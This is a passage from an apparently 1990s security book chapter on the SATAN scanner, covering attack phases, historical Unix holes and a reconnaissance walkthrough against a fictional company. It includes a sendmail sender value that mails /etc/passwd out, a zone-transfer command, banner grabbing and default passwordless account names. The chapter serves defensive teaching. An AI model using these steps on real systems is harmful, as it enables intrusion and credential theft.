
SATAN and the Internet Inferno 433
These classifications can be further split into three finer degrees:
n Read access
n Non-root write and execution access
n Root write and execution access
The denial of service attack does not fall cleanly into any category and is listed as ITL Class 0.
Table 8.1
The Internet Threat Level (ITL) Scale
Class Description
0 Denial of service attack—users are unable to access files or programs.
1 Local users can gain read access to files on the local system.
2 Local users can gain write and/or execution access to non–root-owned files
on the system.
3 Local users can gain write and/or execution access to root-owned files on the
system.
4 Remote users on the same network can gain read access to files on the system
or transmitted over the network.
5 Remote users on the same network can gain write and/or execution access to
non–root-owned files on the system or transmitted over the network.
6 Remote users on the same network can gain write and/or execution access to
root-owned files on the system.
7 Remote users across a firewall can gain read access to files on the system or
transmitted over the network.
8 Remote users across a firewall can gain write and/or execution access to non–
root-owned files on the system or transmitted over the network.
9 Remote users across a firewall can gain write and/or execution access to rootowned
files on the system.
Fixing every security problem and installing every security patch can be an expensive proposition.
It might be useful to classify the severity of the threat in order to allocate resources
proportional to that severity. For example, if an analysis of your system revealed five Class 1
holes and one Class 9 hole, it would probably be wise to allocate resources toward closing the
Class 9 hole. It may not even be necessary to close the Class 1 holes, depending on the
importance of the data on the system.
434 Part II: Gaining Access and Securing the Gateway
The threat level of a security vulnerability must be weighted by at least several factors:
n The purpose of the system
n The secrecy of the data on the system
n The importance of data integrity
n The importance of uninterrupted access
n The user profile
n The system’s relation to other systems (Is it trusted by other systems? Does it NFS
export a file system?)
Trade-Offs between Environment and Vulnerabilities
Class 1 through 3 problems are typically not so critical that the system must be stopped
immediately. System administrators frequently have control over local users to an extent that
these problems are not exploited, at least not maliciously. For example, in a company setting, a
department system is used only by members of that department, and exploitation of holes does
not go unnoticed.
Class 4 through 6 problems are much more serious, because non-electronic control over the
intruders is no longer simple. However, in many corporate or organizational environments, the
majority of systems are behind firewalls, and the majority of members of that organization can
be trusted, to some extent. For systems directly connected to the Internet, these problems are
extremely serious. SATAN specifically searches for vulnerabilites in the Class 4 to Class 6
range.
Class 7 through 9 problems are very serious problems; with Internet access a requirement for
most organizations, firewalls are the only barrier between a company’s most guarded data and
intruders. A security hole that can cross a firewall is serious enough for an organization to
seriously consider an immediate disconnection from the Internet—not a decision to be taken
lightly. SATAN does search for vulnerabilities in this range. Most organizations only connect
to the Internet through a firewall system that offers a limited amount of network services, has
packet filtering, and is frequently scrutinized by system administrators. Under these conditions,
SATAN should not find many vulnerabilities in this range. One such SATAN scan is the
search for a recent version of sendmail: sendmail is nearly always run on firewall systems, and
holes in the older versions of sendmail permitted intruders to cross the firewall.
A multiuser system intended for payroll management would find a Class 1 hole to be much
less tolerable than a single-user workstation intended for CAD designs. For example, it
probably would not be acceptable to allow a contractor to view the current paycheck of the
CEO, though it would be acceptable for an engineer to view the contents of the shadow
password file.
SATAN and the Internet Inferno 435
A multiuser system that served as an inventory control machine for many users might find
Class 3 holes to be a much greater threat than Class 7 holes because of the great importance of
uninterrupted uptime. For example, permitting someone on the manufacturing floor to write
root-owned files, such as the number of CD-ROM players in the stockroom, would be more of
a realistic problem than the threat of a remote user reading through large numbers of files
indicating the stocking level of parts.
A system with sophisticated users might be vulnerable to Class 3 holes also, because such users
might want to exploit these holes for making configuration changes outside the official system
administration path; for example, a system used by many programmers to do builds of software
packages might be vulnerable to a Class 3 hole when one user uses the hole to make changes to
disk quota settings, makes a mistake, and causes the system to crash. All the other programmers
who depend on the system to build software packages are now unable to do their work.
System Classifications
The U.S. DoD (Department of Defense) created a computer security classification scale in
a document called the “Orange Book” (DOD, 1985a). Computer systems were classified as
A-level, B-level, or C-level, with A-level being the most secure and each of these levels having
subcategories. Most Unix systems are C-level, with some claiming C2 compliance or certification.
Some Unix systems offer variants that are B-level.
An alternative baseline for security classifications could be based on the aforementioned ITL
class ratings: a system could be branded based on its highest ITL class problem. For example, a
system running a standard NFS server and exporting a file system for read-only access would
be at least an ITL Class 5 system. The ideally secure system would be an ITL Class –1 system,
probably corresponding to a system that is disconnected from the Internet. The highest
security obtainable for a standard Internet Unix system is an ITL Class 0 rating, and vendors
should be readily able to provide patches to permit customers to obtain this level of security.
SATAN attempts to classify systems based on the severity of vulnerabilities found. SATAN’s
classification system, and how it corresponds to the ITL class ratings, is presented later in this
chapter. It would be quite useful if SATAN used the ITL classification scale: a numerical index
is a much better tool for comparing systems and allowing an organization to manage a large
number of computers. For example, an IT group could set goals of “less than 10% of all
systems are ITL Class 4 or higher,” and use SATAN to run periodic scans to enforce this
policy—in a dynamically changing environment, only SATAN, or some other similar tool,
would be able to enforce such a policy.
Common Attack Approaches
Before looking at common attacks, it is useful to characterize the attack. Attacks can be made
against a particular system or a particular organization.
436 Part II: Gaining Access and Securing the Gateway
When attacking an organization, attacks can be oriented to look for mistakes due to the
distributed control of the systems. An intruder needs only a single window of opportunity to
enter the network. Such attacks focus on breadth rather than innovation. For example, if I
wanted to attack the U.S.’s DoD Milnet network, it would probably be most expedient to
search all the Milnet gateway systems for one that ran old versions of sendmail, offered
unrestricted NFS exports, or ran an NIS server, rather than trying to find a new vulnerability
in the HTTP protocol.
Attacks against single hosts might take advantage of weaknesses in that host as well as vulnerabilities
in “nearby” systems, that is, systems that are trusted by the target system, systems that
are connected to the same physical network, or systems that have the same users. In the first
case, attackers can try to masquerade as the trusted system or user using IP spoofing and DNS
cache corruption. In the second case, attackers can try to install packet sniffers that will capture
traffic going to and from the target system. In the final case, attackers can try to find user
passwords and try them on the target system.
Note For more information on spoofing and sniffing, see Chapter 6.
In general, most attacks follow three phases:
n Get access to the system
n Get root access on that system
n Extend access to other nearby systems.
Phase One: Get a Login Account
The first goal of any attack on a Unix system is to get a login account and a password. The
attacker wants to get a copy of the encrypted passwords stored in /etc/passwd or an NIS map.
Once they have the passwd file, they can run Crack on it and probably guess at least one
password. Even though policy guidelines and system software try to enforce good password
selection, it rarely happens.
Note Crack is a program originally created by Alec Muffett of Sun Microsystems. It tries to
guess passwords, encrypt these guesses, and compare the encrypted guesses to the
encrypted fields of each user account in a password file. By using some intelligent
rules, such as permutations on the login name, and a user-provided dictionary of
words and names, which can be as large as the user specifies, Crack can be
surprisingly effective at quickly guessing passwords. With even a simple dictionary
of a few hundred common passwords, Crack has a good likelihood of cracking an
account in minutes. With a megabyte dictionary, Crack may run for a few days, but
it has a high chance of finding even obscure passwords. See Appendix B, “Internet
Security References,” for the FTP location of Crack.
SATAN and the Internet Inferno 437
How does an attacker get a login to a target Unix system? First, the hacker gathers information
about security holes that exist in different Unix products and ways to exploit these holes.
Second, the hacker gathers information about a target organization’s computer systems and
networks. Finally, the hacker matches the opportunities with the vulnerability information and
attempts to gain a login into the system.
It is true that other attacks can occur, most notably the denial of service attack (described in
detail later in this chapter); however, the attempt at gaining login access appears to be the most
dangerous and frequent.
SATAN specifically addresses remote vulnerabilities. This chapter demonstrates a step-by-step
procedure of how an intruder would implement the first phase of an attack.
Absurd as this may sound, the legal implications of running a program such as
Crack may be quite severe. In early 1995, Randall Schwartz, author of several books
on PERL, was convicted in Oregon, along with other charges, of running Crack
against the /etc/passwd file of an Intel Corporation system. Even though he was
working for Intel as a security consultant, Intel had not authorized him to run Crack.
Be certain that your company permits you to run Crack before attempting to do so.
Phase Two: Get Root Access
The second phase of an attack is not necessarily a network problem. The intruder will try to
exploit existing holes on a particular Unix system, such as trying to find a set-uid root script, in
order to gain the ability to run as root. Some network problems, such as unrestricted NFS
access with root permissions for reading and writing, can be used to gain root access. SATAN
really does not specifically investigate this area of an attack—instead, SATAN scans for phase
one problems that permit a remote user to gain access to the system at either a user or root
level. A better tool for this second phase might be COPS, another program from the makers of
SATAN (see Appendix B for details on getting COPS).
The appropriate way for a system administrator to protect a system from this attack is to
closely follow security advisories from vendors, CIAC, and CERT, and install patches as they
become available. Careful configuration and setup can help to minimize potential vulnerabilities.
If a hole exists that permits the user to act as root, the intruder can possibly still be caught
by tracks left in utmp/wtmp. (All currently logged in users are listed in the utmp file. A history
of all logins and logouts are transferred from the utmp file to the wtmp file. The “last”
command will format the wtmp file and provide a complete listing of all logins, including
information on the source of the login and the duration of the login.) However, not all
programs leave entries in the utmp/wtmp files: remsh/rsh execute commands on the remote
system without making any entry into the utmp/wtmp file. The syslog files are also extremely
useful in monitoring system activity. Security monitoring programs exist that offer additional
tracking capabilities.
Warning
438 Part II: Gaining Access and Securing the Gateway
Programs that permit users to gain superuser access, such as sudo, .do, !, sys, or osh, should be
offered to users on a time-limited basis, such as an automatic 24-hour limit, to minimize root
exposure. Some of these programs, such as osh, provide for control over what root actions are
permitted, decreasing the scope of damage that could occur. Regardless, the root password
should be changed frequently, and control on login locations for root (console only) should be
considered. (This is described in detail in the “Passwords” section of this chapter.)
Phase Three: Extend Access
After the intruder has root access, the system can be used to attack other systems on the
network. Common attack approaches include modifications to login daemons to capture
passwords (ftpd, telnetd, rlogind, login), addition of packet sniffers that capture the passwords
of network traffic and send them back to the intruder, and masquerade attacks that attempt to
use trust to gain access.
As mentioned before, SATAN specifically focuses on the first phase of an attack, and offers
some help in the second phase. SATAN does not typically play a role in this third phase. Using
the burglar analogy, SATAN helps to locate a car in the parking lot that has an unlocked door
and indicates which door is unlocked (first phase). Then the burglar either looks for car keys
left above the visor, or hotwires the car (second phase). Finally, this third phase involves
driving the car around the parking lot to find other cars that are unlocked. As SATAN may
have gathered information about other important hosts (NFS servers or NIS servers), this third
phase may use that information to focus attacks on gathering access to those systems.
In general, once an intruder has control of your system, there is little you can do. A competent
intruder can easily cover his tracks by modifying accounting and auditing records. Some
enterprising hackers have even built automated programs that completely hide all traces of
their presence; one popular version of this is called rootkit. This package comes with source for
programs such as ps, ls, sum, and who; the system administrator is no longer able to determine
the integrity of binaries because the sum command gives tainted information. Similarly, the ps
command does not show the admin programs run by the intruder. Fortunately, rootkit is quite
difficult to find—the primary distribution method has not been through FTP archives.
If you suspect that an intruder has gained root access to your system, you should get a fresh
copy of admin binaries such as sum or md5 and check the checksums of binaries against the
original versions on the distribution CD. The COPS program can help do this. Another
similar program, Tripwire, offers similar functionality to COPS.
An Overview of Holes
At this point, the general approach of a network attack should be clear. To explore the first
phase of an attack, you should now investigate details on security holes that have been closed
in popular Internet services. The following holes have been patched by most vendors and
announced by CERT or the vendors; however, similar holes are frequently re-opened in new
SATAN and the Internet Inferno 439
releases, and many system administrators are slow to apply patches. This should clarify the fact
that system administrators should install vendor patches as soon as they are released.
Unlike misconfiguration errors, which are described in detail later in the chapter, these security
holes have arisen due mostly to software programming mistakes in the network daemons.
Although the core set of scans included in SATAN does not include each of these holes, adding
scans for the following holes to SATAN would be quite straightforward. An example of adding
a scan to SATAN is included at the end of this chapter.
Note A useful paper by Landwehr (Landwehr et al., 1993) gives a breakdown of the
source of 50 security flaws. Of these 50 security holes, 9 were introduced because
of user configuration errors, 3 were introduced by the vendor during code maintenance
(patches), and the remaining 38 were introduced by the software designers
during the design and creation of the program.
sendmail -d Debug Hole
A recent sendmail hole involved the -d command-line option, which permits a user to specify a
debug level. All users must be able to invoke sendmail in order to send mail. By specifying a
very large value to the debug option of sendmail, a user could overwrite the stack frame and
cause unexpected commands to be executed. This was fixed by adding a range check to the
passed values. SATAN scans for versions of sendmail that are old enough to include this
security hole.
sendmail Bounce to Program Hole
By specifying a user such as |/bin/mail amyp@diana.com < /etc/passwd as the sender of a
message, and then indicating a bad recipient name, sendmail would accept the message,
attempt to send to the bad recipient, realize that user did not exist, and bounce an error
message back to the sender. The sender would in reality be a program that executed, causing a
malicious action such as mailing the passwd file. Sendmail was not smart enough to prevent
senders from being programs. Once again, SATAN scans for versions of sendmail that are old
enough to include this security hole.
sendmail syslog Buffer Problem
sendmail, along with many other programs, uses syslog() calls to send information to the
syslogd daemon. The buffer dedicated to reading syslog() writes in the syslogd daemon does
not look for overflows. The syslog() call would invoke the vsprintf() libc call and overflow the
stack frame for the vsprintf() call. The vsprintf() call was modified to prevent an overflow of
the stack frame. A hacker script was made available to gain root access on Sun OS systems by
writing long information into the appropriate fields of an SMTP transfer, causing the remote
sendmail to invoke a root shell.
440 Part II: Gaining Access and Securing the Gateway
fingerd Buffer Problem
One of the vulnerabilities exploited by the famous Internet worm, fingerd would read a line of
information using the gets() call. The buffer allocated for the string was 512 bytes long, but
the fingerd program did not check to see that the read was greater than 512 bytes before
exiting the subroutine. If the line of information was greater than 512 bytes, the data was
written over the subroutine’s stack frame return address location. The stack could be rewritten
to permit the intruder to create a new shell and execute commands.
The Internet worm wrote 536 bytes of information to the gets() call, with the overflowing 24
bytes consisting of VAX assembly language code that, upon return from the main() call, tried
to execute a shell by calling execve(“/bin/sh”,0,0).
hosts.equiv Username Problem
If a username was specified in the hosts.equiv file, in addition to the hostname, that user on
that remote host could specify the username of any user on the system and gain access. For
example, if the system george had an /etc/hosts.equiv that contained the line halifax julie, the
user julie on the remote system halifax could gain access as any user on system george. This was
caused by the ruserok() libc routine, which tried to leverage the code from the .rhosts check
using a goto call.
SSL httpd Randomization Problem
The Netscape Navigator implementation of SSL had a flaw of using a predictable random
number generator. (SSL stands for Secure Sockets Layer, a protocol that permits authentication
and encryption—the implementations of this protocol involve the use of a library of
routines that permit a nearly drop-in replacement of standard socket calls. SSL is more fully
explained later in this chapter in the section “SSL.”) So, even though the encryption used
IDEA, RC4-120, or Triple-DES, in which the key size is over 120 bits, the key was generated
with a random number chosen from a 16- to 32-bit space. A brute force search of all possible
random numbers could quickly find the chosen value and therefore find the session key. The
problem with session keys is that they depend on good random numbers, and no computer can
currently easily create a good random number. This is a weakness for all cryptographic systems.
RFC 1750, Randomness Requirements for Security, attempts to address this issue. Interestingly,
Netscape offered their implementation to public review via the Internet (ftp://
ftp1.netscape.com/pub/review/RNGsrc.tar.Z) to try to strengthen the randomness of the
algorithm.
TCP Sequence Guessing Problem
Even though a system has turned off support for the IP source routing option, an intruder
can fool that system into believing that it is communicating with a trusted host. The intruder
first initiates a TCP connection to the target system using a true IP address, then exits the
SATAN and the Internet Inferno 441
connection. The intruder now initiates a new connection using the IP address of a trusted
system. For example, the target has a hosts.equiv file that indicates host B to be trusted. The
intruder makes connection to the remshd port (shell 512/TCP) with the IP address of the
trusted system. To carry on the masquerade, the intruder needs to ACKnowledge each TCP
packet from the target. Because the algorithm for choosing the next sequence number for a
new TCP connection was predictable, the intruder could easily guess it. So, when the target
system sent the response packet to the real trusted system, which discarded it because no active
listener was available, the intruder quickly sent back the appropriate acknowledge packet to
complete the TCP connection. The intruder would then gain access through the rcmds and
the hosts.equiv trust by hostname mechanism.
The solution to this problem is to make the sequencing between new TCP connections more
difficult to guess, by randomizing it. Although this does not prevent an intruder from guessing
it, it does make guessing much more difficult. Most intruders do not have direct access to the
physical network via a sniffer, so they cannot hijack existing connections using this mechanism.
If they do have physical access, hijacking of existing connections can be done. For a
deeper analysis, see the paper by Bellovin (Bellovin, 1993).
ftpd Server Bounce Problem
The proxy server feature of ftpd was created to permit third-party transfers of files. A user can
request a proxy transfer from one ftpd to another remote ftpd. This feature, actually specified
in the RFC requirements, when combined with the quote command, the PORT statement,
and the PASV statement, permits a user to avoid IP access controls and traceability.
The core of the problem is that a user can request a remote ftpd server to send a file to any IP
address and TCP port. So, the user could request the remote ftpd to send a file containing
valid network protocol commands to a server program listening on any TCP port on any host,
causing that server to believe that the source of the network protocol connection is the remote
ftpd.
Imagine, for example, that a user in France wants to FTP a file from MIT that is available only
to U.S. users. The MIT ftpd screens out IP addresses from outside the U.S., in an attempt to
comply with U.S. export restrictions of cryptographic material. The French user connects to
another U.S. ftpd and logs in as an anonymous user. The French user ftps to her own machine
and puts it into a PASV mode, then does a STOR of a new file, say foobar. The French user
now anonymously sends a text file containing FTP protocol statements to the U.S. ftpd. These
statements include a PORT command with the IP address and port number of the French ftpd
that is doing a passive listen and STOR, as well as a subsequent RETR to retrieve the desired
file.
The French user now specifies a quote PORT command to the U.S. ftpd that indicates the
FTP control port (21) on the MIT machine. Finally, the French user specifies a quote RETR
command to the U.S. ftpd for the text file containing the command statements. The U.S. ftpd
442 Part II: Gaining Access and Securing the Gateway
sends this file containing the port address of the waiting French ftpd in a PORT command,
along with the appropriate commands for getting the desired files, to the MIT machine, which
approves the U.S. IP address and sends the file to the French ftpd, which is still waiting with
the STOR command to retrieve the file called foobar. The MIT file is therefore sent to the
French ftpd and stored as foobar on that site, whereas the MIT ftpd logs indicate that the file
was sent to the U.S. ftpd.
This same approach could be used to send protocol packets to any port on any system through
the bouncing ftpd, thereby hiding the true IP address of the originating sender. Completely
untraceable e-mail or Usenet news postings could be done this way, which would be a benign
use of this hole. A malicious user would be able to completely fool any IP address restrictions
on a target system.
The only way to avoid this is to turn off proxy functionality completely. See the paper at ftp:/
/avian.org/random/ftp-attack for full details on this hole and the suggested fix to ftpd.
portmap Forwarding
The portmap program forwards mount requests to the rpc.mountd and causes them to
appear to originate from the IP address of the system running portmap. This eliminates IP
source restrictions on NFS servers from taking effect. SATAN does a scan for this portmap
vulnerability.
World-Writeable Mail Directory and Links
When the /var/mail directory is world-writeable, any user can create a file in that directory. If a
user created a link from a username to an outside file, sendmail’s delivery agent, such as /bin/
rmail, would write the incoming mail file to the linked file. Imagine if a user created a link
from /var/mail/root to /etc/passwd. The user could then mail a new username to root and have
it appended to /etc/passwd. The /var/mail directory should never be world-writeable.
NFS uid 16-Bit Problem
An NFS server depends on client-side authentication, verifying only the source IP address of
the request, so claiming to fix an NFS server vulnerability is a tenuous claim at best. In general,
root access to files on an NFS server require an explicit statement in the exports file; otherwise,
root client requests have their uid mapped to –2 (nobody), which restricts their access to
world-accessible files.
However, a user that claimed a client uid of 0 + 2^16 = 65536 would be acceptable to NFS
and not get remapped to a new uid. When that user requested access to a root-owned file, the
comparison of uids would use only the lower 16 bits of the uid, allowing this user to masquerade
as root.
SATAN and the Internet Inferno 443
arp -f Problem
The arp program uses an -f flag to permit a user to specify a file containing an arp cache to be
read. If that file is in an unacceptable format, arp prints out the contents as an aid for debugging.
This means that a regular user can read any root-owned file on the system by specifying
that file to arp using the -f option.
sendmail -C Problem
sendmail permits the invoker to specify a configuration file. Because any user can invoke
sendmail (this is required to be able to send mail), and because sendmail does a set-uid to root,
this means that sendmail can read any root-owned file. The vulnerability was that if the file
specified was an unacceptable choice, sendmail would print the contents out as an aid for
debugging. This meant that a regular user could read any root-owned file on the system by
specifying that file to sendmail using the -C option.
rwall Writing Problem
A user could create an entry into the utmp file of current users that really represented a
filename. Then invoking rwall to send a message to all users would result in that message being
written to that file. A new /etc/passwd file or a /.rhosts file could be written by using the
appropriate message. This problem was a result of the fact that the utmp file could be modified
by a regular user.
Note Advice to designers: Notice that several of the security holes are based on the same
common mistakes. Programs that avoid range checking on strings or values that can
be passed in by the remote user (syslog, fingerd, sendmail debug), resulting in the
stack frame being overwritten are continually being found. Programs that have
higher privileges and can manipulate files, by either reading and printing them out
or writing them and allowing a user to specify the pathname (write the log to /etc/
passwd) or to create a link from the standard pathname, are frequently seen. Clientside
authentication is not acceptable, yet many programs continue to think that if a
system administrator on the client system approves authentication, security is
maintained—surprisingly, many hackers double as system admins for their systems.
Finally, security that depends solely on hostname or IP authentication can be easily
circumvented.
Learning about New Security Holes
SATAN is distributed with scans for only a handful of vulnerabilities. Granted, the vulnerabilities
that SATAN scans for are quite widespread and severe in nature; however, SATAN
provides a wonderful framework for easily adding scans for new security holes. A vigilant
system administrator can easily add new scans (demonstrated later in this chapter), if he or she
knows about new security holes.
444 Part II: Gaining Access and Securing the Gateway
The Internet is a wonderful place to find out about new security holes. Network news, mailing
lists, Web sites, FTP archives, and vendor patches all help to identify new security issues. The
section at the end of the chapter contains a detailed list of network sites and mailing lists.
The best place to start is with the network newsgroups. Although new groups are always being
created, a core set of useful groups can always be depended upon: comp.security.unix,
comp.security.misc, and alt.security are the primary groups that deal with security. A few
others, such as comp.security.firewalls, comp.security.announce, alt.2600, and
sci.crypt, are occasionally useful, although these groups contain quite a bit of theory or
noise. Although books and papers can provide you with a good basis for understanding
security, it is a rapidly developing field, and the newsgroups are the latest source for updates.
Mailing lists are quite useful, although they can generate quite a bit of uninteresting traffic.
The most popular list is bugtraq, which has continuing discussions about new vulnerabilities
and security topics. The 8lgm list is very useful in learning about new holes and getting
exploitation information, because they frequently post detailed information on vulnerability.
The CIAC, CERT, and vendor lists are useful in announcing the availability of new patches to
address security holes; they rarely announce the presence of holes that are not yet fixed.
Other non-security-related mailing lists that directly address Internet services also frequently
deal with security. Mailing lists for sendmail, bind, SSL, Kerberos, e-payments, ipk (public key
infrastructure), ietf-822, drums (e-mail), and IETF working groups all offer useful tidbits,
although the volume on each is quite high compared to the number of security-related issues.
The advent of the World Wide Web has resulted in the creation of many Web pages dedicated
to security. Some of the best include the U.S. DOE’s CIAC Web site and the Purdue University
COAST project site. A list of Web sites is included in Appendix B.
Reverse engineering patches from vendors that have catalog descriptions indicating security
problems can always be informative. Perhaps the other vendors have yet to fix this problem, or
perhaps the other OS platforms are not yet patched?
FTP security archives, such as Wietse Venema’s ftp.win.tue.nl, CERT’s ftp.cert.org, and
Texas AMU’s net.tamu.edu, are very useful sources for new programs and papers. A list of
various FTP archives is included in Appendix B.
Watch for Linux source code changes on ftp.sunsite.unc or your favorite mirror, because
Linux is usually at the cutting edge of technology for many Internet services.
Finally, you should look for updates to SATAN itself, in case scans for new vulnerabilities are
added into the base distribution.
SATAN and the Internet Inferno 445
Thinking Like an Intruder
Sometimes, the best way to learn about new holes is to think like an intruder and analyze a
system from that standpoint. The first phase of a network attack consists of gaining information
about security holes. The previous sections have shown some sample security holes as well
as how to learn about new ones. The next part of this phase is gaining information about the
target systems. This is best taught by a demonstration, albeit a naive and primitive one.
The creators of SATAN gained notoriety a few years before SATAN’s release when they
published a paper entitled “Improving the Security of Your Site by Breaking Into It” (Farmer
& Venema, 1993). The novel idea was not popular with some system administrators, because
the paper provided a training manual of sorts for new hackers. Work on the paper led the
authors to create SATAN, so it is appropriate to try to follow the same approach in learning
about SATAN. This approach can be useful in creating policies and configurations that
improve the security of an organization.
Instead of using a real organization, the example uses a hacker that attempts to gain access to
an imaginary company called NotReal Corporation. The hacker’s goal is to break into the
company’s computer systems and get as much control over their systems as possible. The
assumption is that the hacker has access to a system on the Internet and will mount the attack
from that location, with no additional access over any other network. The example steps
through the general procedure that a non-automated attack would use, so that the automated
approach used by SATAN is more clear.
Gathering Information on Systems
What the hacker would like to do is create a map of all the systems in the company, along with
version numbers of the OS, lists of the usernames, and a list of the network services that are
being run on those systems.
Getting Hostnames and IP Addresses
By running whois notreal.com, the hacker can get back either a list of hosts on the notreal.com
network or a message about the notreal.com network. The whois program contacts the
Internic and finds matches of names (administrator names, hostnames, network addresses, and
so on) from the DNS records kept by the Internic. Sometimes, the whois output contains a
prepared message that includes a nicely formatted list of the domain servers along with system
admin names.
(The new whois++ standards in RFC 1834 and RFC 1835 improves the information available
from the Network Information Center that stores the whois database.)
446 Part II: Gaining Access and Securing the Gateway
For example, here is what the hacker might see as a result of doing a whois notreal:
# whois notreal
Notreal Corporation (NOTREAL-DOM) NOTREAL.COM
Notreal - Bldg 11 (NET-NSOFT-1) NSOFT-1 123.45.67.89
Notreal (NRWORD-DOM) NRWORD.COM
Notreal Corporation (NOB3-DOM) NOB.COM
...
Now run nslookup:
# nslookup
...
> set type=any
> notreal.com
Name Server: mylocal.hackersystem.com
Address: 1.2.3.4
Non-authoritative answer:
notreal.com nameserver = dns1.notreal.COM
notreal.com nameserver = dns.somebodyelse.COM
notreal.com preference = 10, mail exchanger = mail.notreal.com
notreal.com preference = 20, mail exchanger = m2.notreal.com
Authoritative answers can be found from:
notreal.com nameserver = dns1.notreal.COM
notreal.com nameserver = dns.somebodyelse.COM
DNS1.NOTREAL.COM internet address = 12.34.56.78
DNS.SOMEBODYELSE.COM internet address = 23.45.67.89
mail.notreal.com internet address = 123.45.67.89
m2.notreal.com internet address = 123.456.78.9
>
The hacker already has a few hosts by using whois and nslookup. The new trick is to pull
down the entire notreal.com map from the DNS server named, running on the
dns1.notreal.com system.
DNS uses secondary name servers that regularly transfer the named db files by requesting them
from the primary name server. Any system can usually request these. (Although the new Bind
4.9.x name servers can be configured to restrict the source addresses of requesting systems, few
use this new configuration option.) The hacker uses the program named-xfer to do exactly
that:
% named-xfer -d notreal.com -f db.notreal 12.34.56.78
% head db.notreal
$ORIGIN notreal.com.
notreal IN SOA dns1.notreal.com. root.dns1.notreal.com. (
2213 10800 3600 604800 86400 )
IN NS dns1.notreal.com.
$ORIGIN dns1.notreal.com.
...
SATAN and the Internet Inferno 447
The hacker is now getting a much better picture of the hosts in the notreal.com domain. He or
she would like to find out how many of these hosts are directly connected to the Internet and
how many are behind a firewall. He or she could do this by trying to ping each host; however,
it is best to create a script that would do this, rather than doing it by hand. Even better, the
fping command can do this most efficiently and is shipped with SATAN. The hacker can
format the db.notreal file to list out all the hosts in the notreal.com domain and then have
fping try to contact each. This aids the hacker in generating a list of systems directly on the
Internet:
% cat notreal.hostlist
dns1.notreal.com
sys1.notreal.com
sys2.notreal.com
mail.notreal.com
m2.notreal.com
...
% fping < notreal.hostlist
dns1.notreal.com is alive
sys1.notreal.com is unreachable
sys2.notreal.com is unreachable
mail.notreal.com is alive
m2.notreal.com is alive
...
The hacker now starts looking at the systems that are connected to the Internet. Ideally, the
hacker would like to know the OS type and brand of each system, so that he or she can
identify problems that may exist on those systems.
telnetd Information
The quickest way to identify the OS type is by attempting to telnet to the systems. The telnetd
provides back a banner line containing this information:
% telnet sys4.notreal.com
Trying...
Connected to sys4.notreal.com.
Escape character is ‘^]’.
HP-UX sys4 A.09.04 U 9000/847 (ttyp4)
login:
This system is an HP-UX 9.04 OS running on an HP 9000 Series 847.
The banner lines from the telnetd prompt of other systems in notreal.com’s domain are
summarized here:
sys3.notreal.com
Digital UNIX (sys3) (ttyp1)
448 Part II: Gaining Access and Securing the Gateway
This system indicates that the manufacturer is Digital but does not indicate the OS type
(Ultrix, OSF/1), version, or hardware platform.
dns1.notreal.com
UNIX(r) System V Release 4.0 (dns1)
This system offers very little information. No assumptions can be made of the OS type. It
happens to come from a Solaris 2.x system, but this banner is no guarantee that the remote
system is indeed a Solaris 2.x box.
m3.notreal.com
IRIX System V.4 (hpcsecf)
This is clearly an SGI IRIX system.
Note While the hacker is telneting to the SGI system, he will try to log in with the account
names that, by default, have no passwords on SGI systems. These account names
are guest, lp, demos, nuucp, root, tour, tutor, and 4Dgifs. (Actually, many Unix
systems still use the guest login with a guest password.)
m4.notreal.com
SunOS UNIX (m4)
This is quite clearly the Sun OS system. It probably is a Sun OS 4.x, but no further details can
be assumed.
sys3.notreal.com
AIX Version 4
(c)Copyrights by IBM and by others 1982, 1994.
This quite clearly is an IBM AIX 4.0.
Note Even though the banners from telnetd given earlier may be accurate today, patches
and new OS releases may change the content of the information. A true intruder
would first try to build up a database of all possible telnetd banners from as many
systems as possible, to characterize all the possible OS sources of a particular
banner. This is also true for the upcoming ftpd and sendmail banners. SATAN uses
the banner information to quickly identify systems.
Note that a hacker can use a packet sniffer to watch users type their password when logging in
using telnet. If users ever telnet to your system across the Internet, have them change their
password as soon as they return to the internal company system. Otherwise, consider using
kerberized telnet, sslized telnet, secure shell (ssh), or one-time passwords. This is also the case
for rlogin, rexec, and FTP.
Also, some telnetds permit the user to pass environment variables to the remote system login
program. Some variables can be quite dangerous to pass in. Review which variables are
SATAN and the Internet Inferno 449
acceptable to you, and be sure that your telnetd filters the appropriate ones. See the recent
CERT advisory on telnetd for more information (CERT CA:95-14).
ftpd Information
The ftpd server gives version information in the opening line of its dialog with a client. It also
allows an unauthorized user to sometimes issue commands, such as system, help, and others.
The hacker tests whether anonymous FTP is available by trying to log in using ftp or anonymous.
If it is available, the hacker then tries to exploit possible problems with ftpd. While on
the system, the hacker downloads every file that is readable, especially the ˜ftp/etc/passwd file.
Anonymous FTP is useful in helping the intruder build up a database of information on the
target system. SATAN gets version information from ftpd and checks if anonymous FTP is
available.
% ftp m2.notreal.com
Connected to m2.notreal.com.
220 m2 FTP server (Digital UNIX Version 5.60) ready.
Name (m2:intruder): ftp
331 Guest login ok, send ident as password.
Password:
230 Guest login ok, access restrictions apply.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> system
215 UNIX Type: L8 Version: OSF/1
ftp> help
Notice that ftpd will respond to the help command with a list of supported commands on this
system. Many Internet services, such as ftpd or sendmail, offer help in response to a help
command. Gathering information on what functionality is available from remote services is the
goal, and the help command is useful in achieving this goal. The following shows a list of
commands offered by the preceding ftpd:
! delete mget quit status
$ dir mkdir quote struct
account disconnect mls recv sunique
append form mode reget system
ascii get modtime rename tenex
bell glob mput reset trace
binary hash newer restart type
bye help nlist rhelp umask
case idle nmap rmdir user
cd image ntrans rstatus verbose
cdup lcd open runique ?
chmod ls prompt send
close macdef proxy sendport
cr mdelete put site
debug mdir pwd size
450 Part II: Gaining Access and Securing the Gateway
The m2 is a Digital Unix system, running OSF/1. The ftpd on Ultrix gives back a similar
message but actually says Ultrix. The help command provides the hacker with a number of
useful tidbits: the site command is available, as are proxy, quote, system, sendport, and other
useful commands. Most ftpd binaries offer a similar list of supported commands in response to
a help request.
% ftp dns1.notreal.com
Connected to dns1.notreal.com.
220 dns1 FTP server (UNIX(r) System V Release 4.0) ready.
Name (dns1:intruder): ftp
530 User ftp unknown.
Login failed.
ftp> system
500 ‘SYST’: command not understood.
ftp>
The hacker gets no information from the ftp prompt and no information from the system
prompt. The preceding prompt came from a Solaris 2.4 system, but such a prompt is no
guarantee that the system is a Solaris 2.4 system. For the sake of brevity, the subsequent ftp
transactions have been edited to remove redundant information such as username and
password prompts.
% ftp m3.notreal.com
Connected to m3.notreal.com.
220 m3 FTP server ready.
ftp> system
215 UNIX Type: L8 Version: SVR4
This system gives the hacker no information at all, other than SVR4 as a system type. This
